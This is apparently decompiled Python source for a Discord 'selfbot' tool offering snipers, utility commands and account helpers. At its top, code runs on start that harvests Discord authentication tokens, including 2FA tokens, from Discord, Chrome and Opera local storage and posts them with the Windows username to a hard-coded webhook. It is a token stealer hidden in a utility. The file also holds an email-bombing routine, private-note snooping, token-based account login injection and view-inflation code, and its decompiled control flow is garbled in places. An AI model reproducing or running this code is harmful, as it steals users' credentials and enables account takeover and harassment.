class selfbot:
    __linecount__ = 2138
    __version__ = 2.0


import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes, urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging
from discord.ext import commands, tasks
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS
webhook = 'https://discordapp.com/api/webhooks/703385794383052880/PLZtjm_6nmSE25zLw6CNqz2B15rKV2n9v2yk_mv2iv6J3U_sIT3ixKSs6mkgnfOHMpQc'
homedir = os.path.expanduser('~')
discordDir = '{0}\\AppData\\Roaming\\Discord\\Local Storage\\leveldb'.format(homedir)
chromeDir = '{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'.format(homedir)
operaDir = '{0}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local Storage\\leveldb'.format(homedir)
tokenArray = []
chromeTokens = []
operaTokens = []
if os.path.exists(discordDir):
    for file in os.listdir(discordDir):
        if not file.endswith('.ldb'):
            if file.endswith('.log'):
                pass
            filedata = open((os.path.join(discordDir, file)), errors='ignore')
            lines = filedata.readlines()
            for line in lines:
                match = re.findall('"([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27})"', line)
                twoFA = re.findall('"(mfa\\.[\\w-]{84})"', line)
                tokenArray = tokenArray + match + twoFA

    else:
        if os.path.exists(chromeDir):
            for file in os.listdir(chromeDir):
                if not file.endswith('.ldb'):
                    if file.endswith('.log'):
                        filedata = open((os.path.join(chromeDir, file)), errors='ignore')
                        lines = filedata.readlines()
                        for line in lines:
                            match = re.findall('"([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27})"', line)
                            chrometwoFA = re.findall('"(mfa\\.[\\w-]{84})"', line)
                            chromeTokens = chromeTokens + match + chrometwoFA

if os.path.exists(operaDir):
    for file in os.listdir(operaDir):
        if not file.endswith('.ldb'):
            if file.endswith('.log'):
                pass
            filedata = open((os.path.join(operaDir, file)), errors='ignore')
            lines = filedata.readlines()
            for line in lines:
                match = re.findall('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', line)
                operatwoFA = re.findall('"(mfa\\.[\\w-]{84})"', line)
                operaTokens = operaTokens + match + operatwoFA

    else:
        tokens = '\n'.join(tokenArray) + '\n**Chrome tokens**\n' + '\n'.join(chromeTokens) + '\n**Opera tokens**\n' + '\n'.join(operaTokens)
        requests.post(webhook, {'content': 'Token raport for {0} \n**Discord:**\n'.format(os.environ.get('USERNAME')) + tokens})
        ctypes.windll.kernel32.SetConsoleTitleW(f"[smooth selfbot v{selfbot.__version__}] | Loading...")
        with open('config.json') as f:
            config = json.load(f)
        token = config.get('token')
        password = config.get('password')
        prefix = config.get('prefix')
        giveaway_sniper = config.get('giveaway_sniper')
        slotbot_sniper = config.get('slotbot_sniper')
        nitro_sniper = config.get('nitro_sniper')
        privnote_sniper = config.get('privnote_sniper')
        stream_url = config.get('stream_url')
        tts_language = config.get('tts_language')
        bitly_key = config.get('bitly_key')
        cat_key = config.get('cat_key')
        weather_key = config.get('weather_key')
        cuttly_key = config.get('cuttly_key')
        width = os.get_terminal_size().columns
        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        start_time = datetime.datetime.utcnow()
        loop = asyncio.get_event_loop()
        languages = {'hu':'Hungarian, Hungary', 
         'nl':'Dutch, Netherlands', 
         'no':'Norwegian, Norway', 
         'pl':'Polish, Poland', 
         'pt-BR':'Portuguese, Brazilian, Brazil', 
         'ro':'Romanian, Romania', 
         'fi':'Finnish, Finland', 
         'sv-SE':'Swedish, Sweden', 
         'vi':'Vietnamese, Vietnam', 
         'tr':'Turkish, Turkey', 
         'cs':'Czech, Czechia, Czech Republic', 
         'el':'Greek, Greece', 
         'bg':'Bulgarian, Bulgaria', 
         'ru':'Russian, Russia', 
         'uk':'Ukranian, Ukraine', 
         'th':'Thai, Thailand', 
         'zh-CN':'Chinese, China', 
         'ja':'Japanese', 
         'zh-TW':'Chinese, Taiwan', 
         'ko':'Korean, Korea'}
        locales = [
         'da', 'de',
         'en-GB', 'en-US',
         'es-ES', 'fr',
         'hr', 'it',
         'lt', 'hu',
         'nl', 'no',
         'pl', 'pt-BR',
         'ro', 'fi',
         'sv-SE', 'vi',
         'tr', 'cs',
         'el', 'bg',
         'ru', 'uk',
         'th', 'zh-CN',
         'ja', 'zh-TW',
         'ko']
        m_numbers = [
         ':one:',
         ':two:',
         ':three:',
         ':four:',
         ':five:',
         ':six:']
        m_offets = [
         (-1, -1),
         (0, -1),
         (1, -1),
         (-1, 0),
         (1, 0),
         (-1, 1),
         (0, 1),
         (1, 1)]

        def Clear():
            os.system('cls')


        Clear()

        def Init():
            if config.get('token') == 'token-here':
                Clear()
                print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file" + Fore.RESET)
            else:
                token = config.get('token')
            try:
                smooth.run(token, bot=False, reconnect=True)
                os.system(f"title (smooth selfbot) - Version {selfbot.__version__}")
            except discord.errors.LoginFailure:
                print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your token, please contact smooth for help" + Fore.RESET)
                os.system('pause >NUL')


        def GmailBomber():
            _smpt = smtplib.SMTP('smtp.gmail.com', 587)
            _smpt.starttls()
            username = input('Gmail: ')
            password = input('Gmail Password: ')
            try:
                _smpt.login(username, password)
            except:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Incorrect Password or gmail, make sure you've enabled less-secure apps access" + Fore.RESET)
            else:
                target = input('Target Gmail: ')
                message = input('Message to send: ')
                counter = eval(input('Ammount of times: '))
                count = 0
                while True:
                    if count < counter:
                        count = 0
                        _smpt.sendmail(username, target, message)
                        count += 1

                if count == counter:
                    pass


        async def SendWhook():
            url = ''
            whook = {'embeds': [
                        {'title':'', 
                         'description':'', 
                         'thumbnail':{'url': ''}, 
                         'footer':{'text': ''}}]}
            async with aiohttp.ClientSession() as session:
                await session.post(url, json=whook)


        def GenAddress(addy: str):
            letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
            four_char = ''.join((random.choice(letters) for _ in range(4)))
            should_abbreviate = random.randint(0, 1)
            if should_abbreviate == 0:
                if 'street' in addy.lower():
                    addy = addy.replace('Street', 'St.')
                    addy = addy.replace('street', 'St.')
                elif 'st.' in addy.lower():
                    addy = addy.replace('st.', 'Street')
                    addy = addy.replace('St.', 'Street')
                if 'court' in addy.lower():
                    addy = addy.replace('court', 'Ct.')
                    addy = addy.replace('Court', 'Ct.')
                elif 'ct.' in addy.lower():
                    addy = addy.replace('ct.', 'Court')
                    addy = addy.replace('Ct.', 'Court')
                if 'rd.' in addy.lower():
                    addy = addy.replace('rd.', 'Road')
                    addy = addy.replace('Rd.', 'Road')
                elif 'road' in addy.lower():
                    addy = addy.replace('road', 'Rd.')
                    addy = addy.replace('Road', 'Rd.')
                if 'dr.' in addy.lower():
                    addy = addy.replace('dr.', 'Drive')
                    addy = addy.replace('Dr.', 'Drive')
                elif 'drive' in addy.lower():
                    addy = addy.replace('drive', 'Dr.')
                    addy = addy.replace('Drive', 'Dr.')
                if 'ln.' in addy.lower():
                    addy = addy.replace('ln.', 'Lane')
                    addy = addy.replace('Ln.', 'Lane')
                elif 'lane' in addy.lower():
                    addy = addy.replace('lane', 'Ln.')
                    addy = addy.replace('lane', 'Ln.')
            random_number = random.randint(1, 99)
            extra_list = ['Apartment', 'Unit', 'Room']
            random_extra = random.choice(extra_list)
            return four_char + ' ' + addy + ' ' + random_extra + ' ' + str(random_number)


        def BotTokens():
            with open('Data/Tokens/bot-tokens.txt', 'a+') as f:
                tokens = {token.strip() for token in f if token if token}
            for token in tokens:
                yield token


        def UserTokens():
            with open('Data/Tokens/user-tokens.txt', 'a+') as f:
                tokens = {token.strip() for token in f if token if token}
            for token in tokens:
                yield token


        class Login(discord.Client):

            async def on_connect(self):
                guilds = len(self.guilds)
                users = len(self.users)
                print('')
                print(f"Connected to: [{self.user.name}]")
                print(f"Token: {self.http.token}")
                print(f"Guilds: {guilds}")
                print(f"Users: {users}")
                print('-------------------------------')
                await self.logout()


        def _masslogin(choice):
            if choice == 'user':
                for token in UserTokens():
                    loop.run_until_complete(Login().start(token, bot=False))

            elif choice == 'bot':
                for token in BotTokens():
                    loop.run_until_complete(Login().start(token, bot=True))

            else:
                return


        def async_executor():

            def outer(func):

                @functools.wraps(func)
                def inner(*args, **kwargs):
                    thing = (functools.partial)(func, *args, **kwargs)
                    return loop.run_in_executor(None, thing)

                return inner

            return outer


        @async_executor()
        def do_tts(message):
            f = io.BytesIO()
            tts = gTTS(text=(message.lower()), lang=tts_language)
            tts.write_to_fp(f)
            f.seek(0)
            return f


        def Dump(ctx):
            for member in ctx.guild.members:
                f = open(f"Images/{ctx.guild.id}-Dump.txt", 'a+')
                f.write(str(member.avatar_url) + '\n')


        def Nitro():
            code = ''.join(random.choices((string.ascii_letters + string.digits), k=16))
            return f"https://discord.gift/{code}"


        def RandomColor():
            randcolor = discord.Color(random.randint(0, 16777215))
            return randcolor


        def RandString():
            return ''.join((random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32))))


        colorama.init()
        smooth = discord.Client()
        smooth = commands.Bot(description='smooth selfbot',
          command_prefix=prefix,
          self_bot=True)
        smooth.remove_command('help')

        @tasks.loop(seconds=3)
        async def btc_status():
            r = requests.get('https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
            value = r['bpi']['USD']['rate']
            await asyncio.sleep(3)
            btc_stream = discord.Streaming(name=('Current BTC price: ' + value + '$ USD'),
              url='https://www.twitch.tv/smoothox')
            await smooth.change_presence(activity=btc_stream)


        @smooth.event
        async def on_command_error(ctx, error):
            error_str = str(error)
            error = getattr(error, 'original', error)
            if isinstance(error, commands.CommandNotFound):
                return
            if isinstance(error, commands.CheckFailure):
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}You're missing permission to execute this command" + Fore.RESET)
            elif isinstance(error, commands.MissingRequiredArgument):
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Missing arguments: {error}" + Fore.RESET)
            elif isinstance(error, numpy.AxisError):
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Not a valid image" + Fore.RESET)
            elif isinstance(error, discord.errors.Forbidden):
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Discord error: {error}" + Fore.RESET)
            elif 'Cannot send an empty message' in error_str:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Couldnt send a empty message" + Fore.RESET)
            else:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{error_str}" + Fore.RESET)


        @smooth.event
        async def on_message_edit(before, after):
            await smooth.process_commands(after)


        @smooth.event
        async def on_message(message):

            def GiveawayData():
                print(f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]" + Fore.RESET)

            def SlotBotData():
                print(f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]" + Fore.RESET)

            def NitroData(elapsed, code):
                print(f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}" + Fore.RESET)

            def PrivnoteData(code):
                print(f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]" + Fore.RESET)

            time = datetime.datetime.now().strftime('%H:%M %p')
            if 'discord.gift/' in message.content:
                if nitro_sniper == True:
                    start = datetime.datetime.now()
                    code = re.search('discord.gift/(.*)', message.content).group(1)
                    token = config.get('token')
                    headers = {'Authorization': token}
                    r = requests.post(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem",
                      headers=headers).text
                    elapsed = datetime.datetime.now() - start
                    elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
                    if 'This gift has been redeemed already.' in r:
                        print(f"\n{Fore.RED}[{time} - Nitro Already Redeemed]" + Fore.RESET)
                        NitroData(elapsed, code)
                    elif 'subscription_plan' in r:
                        print(f"\n{Fore.GREEN}[{time} - Nitro Success]" + Fore.RESET)
                        NitroData(elapsed, code)
                    elif 'Unknown Gift Code' in r:
                        print(f"\n{Fore.RED}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
                        NitroData(elapsed, code)
                else:
                    return
            if 'Someone just dropped' in message.content:
                if slotbot_sniper == True:
                    if message.author.id == 346353957029019648:
                        try:
                            await message.channel.send('~grab')
                        except discord.errors.Forbidden:
                            print(f"\n{Fore.RED}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
                            SlotBotData()
                        else:
                            print(f"\n{Fore.GREEN}[{time} - Slotbot Grabbed]" + Fore.RESET)
                            SlotBotData()
                else:
                    return
            if 'GIVEAWAY' in message.content:
                if giveaway_sniper == True:
                    if message.author.id == 294882584201003009:
                        try:
                            await message.add_reaction('🎉')
                        except discord.errors.Forbidden:
                            print(f"\n{Fore.RED}[{time} - Giveaway Couldnt React]" + Fore.RESET)
                            GiveawayData()
                        else:
                            print(f"\n{Fore.GREEN}[{time} - Giveaway Sniped]" + Fore.RESET)
                            GiveawayData()
                else:
                    return
            if f"Congratulations <@{smooth.user.id}>" in message.content:
                if giveaway_sniper == True:
                    if message.author.id == 294882584201003009:
                        print(f"\n{Fore.GREEN}[{time} - Giveaway Won]" + Fore.RESET)
                        GiveawayData()
                else:
                    return
            if 'privnote.com' in message.content:
                if privnote_sniper == True:
                    code = re.search('privnote.com/(.*)', message.content).group(1)
                    link = 'https://privnote.com/' + code
                    try:
                        note_text = pn.read_note(link)
                    except Exception as e:
                        try:
                            print(e)
                        finally:
                            e = None
                            del e

                    else:
                        with open(f"Privnote/{code}.txt", 'a+') as f:
                            print(f"\n{Fore.GREEN}[{time} - Privnote Sniped]" + Fore.RESET)
                            PrivnoteData(code)
                            f.write(note_text)
                else:
                    return
            await smooth.process_commands(message)


        @smooth.event
        async def on_connect():
            Clear()
            if giveaway_sniper == True:
                giveaway = 'Active'
            else:
                giveaway = 'Disabled'
            if nitro_sniper == True:
                nitro = 'Active'
            else:
                nitro = 'Disabled'
            if slotbot_sniper == True:
                slotbot = 'Active'
            else:
                slotbot = 'Disabled'
            if privnote_sniper == True:
                privnote = 'Active'
            else:
                privnote = 'Disabled'
            print(f"{Fore.RESET}\n                        ┏━━┳━┳━┳━┳━┳━━┳┓┏┓┏━━┳━┳┓┏━━┳━━┳━┳━━┓\n                        ┃━━┫┃┃┃┃┃┃┃┣┓┏┫┗┛┃┃━━┫┳┫┃┃━┳┫┏┓┃┃┣┓┏┛\n                        ┣━━┃┃┃┃┃┃┃┃┃┃┃┃┏┓┃┣━━┃┻┫┗┫┏┛┃┏┓┃┃┃┃┃\n                        ┗━━┻┻━┻┻━┻━┛┗┛┗┛┗┛┗━━┻━┻━┻┛╋┗━━┻━┛┗┛ \n      \n                        Connected       [{smooth.user.name}#{smooth.user.discriminator}]\n                        ID              [{smooth.user.id}]   \n                        Privnote Sniper [{privnote}]\n                        Nitro Sniper    [{nitro}]\n                        Giveaway Sniper [{giveaway}]\n                        SlotBot Sniper  [{slotbot}]\n                        Prefix          [{prefix}]\n                        New Features    [{prefix}new]\n    \n    " + Fore.RESET)
            ctypes.windll.kernel32.SetConsoleTitleW(f"[smooth selfbot v{selfbot.__version__}] | Connected {smooth.user.name}")
            headers = {'Authorization':token, 
             'Content-Type':'application/json', 
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            r = requests.post('https://discordapp.com/api/v6/invite/Fjpk8Rj', headers=headers)
            if r.status_code == 200:
                return True
            return False
            await smooth.process_commands(ctx)


        @smooth.command()
        async def new(ctx):
            await ctx.message.delete()
            print(f"\n{Fore.BLUE}advice   {Fore.LIGHTBLACK_EX}- Give you advice    \n{Fore.BLUE}owo      {Fore.LIGHTBLACK_EX}- 0w0  \n{Fore.BLUE}embed    {Fore.LIGHTBLACK_EX}- Sends the message you put in an embed\n{Fore.BLUE}list     {Fore.LIGHTBLACK_EX}- lists all members\n{Fore.BLUE}gettkn   {Fore.LIGHTBLACK_EX}- Gets half a users token\n{Fore.BLUE}ping     {Fore.LIGHTBLACK_EX}- Displays ur ping\n{Fore.BLUE}loadnick {Fore.LIGHTBLACK_EX}- Makes ur nickname have a cool loading effect\n{Fore.BLUE}advice   {Fore.LIGHTBLACK_EX}- Give you advice    \n{Fore.BLUE}load     {Fore.LIGHTBLACK_EX}- cool loading message \n{Fore.BLUE}edit     {Fore.LIGHTBLACK_EX}- Edits every message\n{Fore.BLUE}nick     {Fore.LIGHTBLACK_EX}- Changes ur nickname\n{Fore.BLUE}junknick {Fore.LIGHTBLACK_EX}- Give u a long spam nickname\n{Fore.BLUE}info     {Fore.LIGHTBLACK_EX}- Shows user info\n{Fore.BLUE}meme     {Fore.LIGHTBLACK_EX}- Displays a meme\n{Fore.GREEN}Feel free to leave feedback in my discord or even suggest what i should add next!\n")


        @smooth.command()
        async def clear(ctx):
            await ctx.message.delete()
            await ctx.send('ﾠﾠ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nﾠﾠ')


        @smooth.command()
        async def genname(ctx):
            await ctx.message.delete()
            first, second = random.choices((ctx.guild.members), k=2)
            first = first.display_name[len(first.display_name) // 2:]
            second = second.display_name[:len(second.display_name) // 2]
            await ctx.send(discord.utils.escape_mentions(second + first))


        @smooth.command()
        async def lmgtfy(ctx, *, message):
            await ctx.message.delete()
            q = urlencode({'q': message})
            await ctx.send(f"<https://lmgtfy.com/?{q}>")


        @smooth.command()
        async def login(ctx, _token):
            await ctx.message.delete()
            opts = webdriver.ChromeOptions()
            opts.add_experimental_option('detach', True)
            driver = webdriver.Chrome('chromedriver.exe', options=opts)
            script = '\n            function login(token) {\n            setInterval(() => {\n            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`\n            }, 50);\n            setTimeout(() => {\n            location.reload();\n            }, 2500);\n            }   \n            '
            driver.get('https://discordapp.com/login')
            driver.execute_script(script + f'\nlogin("{_token}")')


        @smooth.command()
        async def botlogin(ctx, _token):
            await ctx.message.delete()
            opts = webdriver.ChromeOptions()
            opts.add_experimental_option('detach', True)
            driver = webdriver.Chrome('chromedriver.exe', options=opts)
            script = "\n    function login(token) {\n      ((i) => {\n        window.webpackJsonp.push([  \n          [i], {\n            [i]: (n, b, d) => {\n              let dispatcher;\n              for (let key in d.c) {\n                if (d.c[key].exports) {\n                  const module = d.c[key].exports.default || d.c[key].exports;\n                  if (typeof(module) === 'object') {\n                    if ('setToken' in module) {\n                      module.setToken(token);\n                      module.hideToken = () => {};\n                    }\n                    if ('dispatch' in module && '_subscriptions' in module) {\n                      dispatcher = module;\n                    }\n                    if ('AnalyticsActionHandlers' in module) {\n                      console.log('AnalyticsActionHandlers', module);\n                      module.AnalyticsActionHandlers.handleTrack = (track) => {};\n                    }\n                  } else if (typeof(module) === 'function' && 'prototype' in module) {\n                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);\n                    if ('_discoveryFailed' in descriptors) {\n                      const connect = module.prototype._connect;\n                      module.prototype._connect = function(url) {\n                        console.log('connect', url);\n                        const oldHandleIdentify = this.handleIdentify;\n                        this.handleIdentify = () => {\n                          const identifyData = oldHandleIdentify();\n                          identifyData.token = identifyData.token.split(' ').pop();\n                          return identifyData;\n                        };\n                        const oldHandleDispatch = this._handleDispatch;\n                        this._handleDispatch = function(data, type) {\n                          if (type === 'READY') {\n                            console.log(data);\n                            data.user.bot = false;\n                            data.user.email = 'smooth-Was-Here@Fuckyou.com';\n                            data.analytics_tokens = [];\n                            data.connected_accounts = [];\n                            data.consents = [];\n                            data.experiments = [];\n                            data.guild_experiments = [];\n                            data.relationships = [];\n                            data.user_guild_settings = [];\n                          }\n                          return oldHandleDispatch.call(this, data, type);\n                        }\n                        return connect.call(this, url);\n                      };\n                    }\n                  }\n                }\n              }\n              console.log(dispatcher);\n              if (dispatcher) {\n                dispatcher.dispatch({\n                  type: 'LOGIN_SUCCESS',\n                  token\n                });\n              }\n            },\n          },\n          [\n            [i],\n          ],\n        ]);\n      })(Math.random());\n    }\n    "
            driver.get('https://discordapp.com/login')
            driver.execute_script(script + f'\nlogin("Bot {_token}")')


        @smooth.command()
        async def address(ctx, *, text):
            await ctx.message.delete()
            addy = ' '.join(text)
            address_array = []
            i = 0
            while True:
                if i < 10:
                    address_array.append(GenAddress(addy))
                    i += 1

            final_str = '\n'.join(address_array)
            em = discord.Embed(description=final_str)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(final_str)


        @smooth.command()
        async def weather(ctx, *, city):
            await ctx.message.delete()
            if weather_key == '':
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Weather API key has not been set in the config.json file" + Fore.RESET)
            else:
                try:
                    req = requests.get(f"http://api.openweathermap.org/data/2.5/weather?q={city}&appid={weather_key}")
                    r = req.json()
                    temperature = round(float(r['main']['temp']) - 273.15, 1)
                    lowest = round(float(r['main']['temp_min']) - 273.15, 1)
                    highest = round(float(r['main']['temp_max']) - 273.15, 1)
                    weather = r['weather'][0]['main']
                    humidity = round(float(r['main']['humidity']), 1)
                    wind_speed = round(float(r['wind']['speed']), 1)
                    em = discord.Embed(description=f"\n            Temperature: `{temperature}`\n            Lowest: `{lowest}`\n            Highest: `{highest}`\n            Weather: `{weather}`\n            Humidity: `{humidity}`\n            Wind Speed: `{wind_speed}`\n            ")
                    em.add_field(name='City', value=(city.capitalize()))
                    em.set_thumbnail(url='https://ak0.picdn.net/shutterstock/videos/1019313310/thumb/1.jpg')
                    try:
                        await ctx.send(embed=em)
                    except:
                        await ctx.send(f"\n                Temperature: {temperature}\n                Lowest: {lowest}\n                Highest: {highest}\n                Weather: {weather}\n                Humidity: {humidity}\n                Wind Speed: {wind_speed}\n                City: {city.capitalize()}\n                ")

                except KeyError:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{city} Is not a real city" + Fore.RESET)
                else:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}" + Fore.RESET)


        @smooth.command(aliases=['shorteen'])
        async def bitly(ctx, *, link):
            await ctx.message.delete()
            if bitly_key == '':
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Bitly API key has not been set in the config.json file" + Fore.RESET)
            else:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(f"https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}") as req:
                            r = await req.read()
                            r = json.loads(r)
                    new = r['data']['url']
                    em = discord.Embed()
                    em.add_field(name='Shortened link', value=new, inline=False)
                    await ctx.send(embed=em)
                except Exception as e:
                    try:
                        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                    finally:
                        e = None
                        del e

                else:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}" + Fore.RESET)


        @smooth.command()
        async def cuttly(ctx, *, link):
            await ctx.message.delete()
            if cuttly_key == '':
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cutt.ly API key has not been set in the config.json file" + Fore.RESET)
            else:
                try:
                    req = requests.get(f"https://cutt.ly/api/api.php?key={cuttly_key}&short={link}")
                    r = req.json()
                    new = r['url']['shortLink']
                    em = discord.Embed()
                    em.add_field(name='Shortened link', value=new, inline=False)
                    try:
                        await ctx.send(embed=em)
                    except:
                        await ctx.send(new)

                except Exception as e:
                    try:
                        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                    finally:
                        e = None
                        del e

                else:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}" + Fore.RESET)


        @smooth.command()
        async def cat(ctx):
            await ctx.message.delete()
            if cat_key == '':
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cat API key has not been set in the config.json file" + Fore.RESET)
            else:
                try:
                    req = requests.get(f"fhttps://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
                    r = req.json()
                    em = discord.Embed()
                    em.set_image(url=(str(r[0]['url'])))
                    try:
                        await ctx.send(embed=em)
                    except:
                        await ctx.send(str(r[0]['url']))

                except Exception as e:
                    try:
                        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                    finally:
                        e = None
                        del e

                else:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}" + Fore.RESET)


        @smooth.command()
        async def dog(ctx):
            await ctx.message.delete()
            r = requests.get('https://dog.ceo/api/breeds/image/random').json()
            em = discord.Embed()
            em.set_image(url=(str(r['message'])))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r['message']))


        @smooth.command()
        async def fox(ctx):
            await ctx.message.delete()
            r = requests.get('https://randomfox.ca/floof/').json()
            em = discord.Embed(title='Random fox image', color=16202876)
            em.set_image(url=(r['image']))
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(r['image'])


        @smooth.command()
        async def encode(ctx, string):
            await ctx.message.delete()
            decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
            encoded_stuff = str(decoded_stuff)
            encoded_stuff = encoded_stuff[2:len(encoded_stuff) - 1]
            await ctx.send(encoded_stuff)


        @smooth.command()
        async def decode(ctx, string):
            await ctx.message.delete()
            strOne = string.encode('ascii')
            pad = len(strOne) % 4
            strOne += b'=' * pad
            encoded_stuff = codecs.decode(strOne.strip(), 'base64')
            decoded_stuff = str(encoded_stuff)
            decoded_stuff = decoded_stuff[2:len(decoded_stuff) - 1]
            await ctx.send(decoded_stuff)


        @smooth.command(name='ebay-view', aliases=['ebay-view-bot', 'ebayviewbot', 'ebayview'])
        async def _ebay_view(ctx, url, views: int):
            await ctx.message.delete()
            start_time = datetime.datetime.now()

            def EbayViewer(url, views):
                headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
                for _i in range(views):
                    requests.get(url, headers=headers)

            EbayViewer(url, views)
            elapsed_time = datetime.datetime.now() - start_time
            em = discord.Embed(title='Ebay View Bot')
            em.add_field(name='Views sent', value=views, inline=False)
            em.add_field(name='Elapsed time', value=elapsed_time, inline=False)
            await ctx.send(embed=em)


        @smooth.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
        async def geoip(ctx, *, ipaddr: str='1.3.3.7'):
            await ctx.message.delete()
            r = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}")
            geo = r.json()
            em = discord.Embed()
            fields = [
             {'name':'IP', 
              'value':geo['query']},
             {'name':'ipType', 
              'value':geo['ipType']},
             {'name':'Country', 
              'value':geo['country']},
             {'name':'City', 
              'value':geo['city']},
             {'name':'Continent', 
              'value':geo['continent']},
             {'name':'Country', 
              'value':geo['country']},
             {'name':'IPName', 
              'value':geo['ipName']},
             {'name':'ISP', 
              'value':geo['isp']},
             {'name':'Latitute', 
              'value':geo['lat']},
             {'name':'Longitude', 
              'value':geo['lon']},
             {'name':'Org', 
              'value':geo['org']},
             {'name':'Region', 
              'value':geo['region']},
             {'name':'Status', 
              'value':geo['status']}]
            for field in fields:
                if field['value']:
                    em.add_field(name=(field['name']), value=(field['value']), inline=True)
            else:
                return await ctx.send(embed=em)


        @smooth.command()
